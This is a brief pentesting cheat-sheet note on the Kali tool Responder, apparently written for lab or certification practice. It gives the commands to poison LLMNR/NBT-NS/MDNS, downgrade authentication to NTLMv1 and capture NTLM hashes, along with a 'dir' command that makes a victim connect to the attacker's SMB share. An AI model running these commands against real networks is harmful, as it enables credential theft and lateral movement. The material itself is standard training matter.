> An inbuilt Kali Linux tool for Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) that responds to specific NetBIOS queries based on the file server request. This tool can be launched by running responder -I eth0 (ethernet adapter name of your network that you want to) -h in the Terminal
> 
> This package contains Responder/MultiRelay, an LLMNR, NBT-NS and MDNS poisoner. It will answer to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix (see: [http://support.microsoft.com/kb/163409)](http://support.microsoft.com/kb/163409)). By default, the tool will only answer to File Server Service request, which is for SMB.


#Web_Application #Windows_Privilege_Escalation #Password_Attacks #NTLM_Hash

Starting Responder on interface tap0
```bash
sudo responder -I tap0
```

Starting Responder verbose to see same hashes again
```
sudo responder -I tun0 -v
```
- Delete Responder.db file to re-capture previously captured hashes

Starting Responder with downgrade to force NTLMv1 if possible
```
sudo responder -I tun0 --lm --disable-ess -v
```

Use the dir command to create an SMB connection to our Kali machine
```cmd
dir \\192.168.123.69\test
```
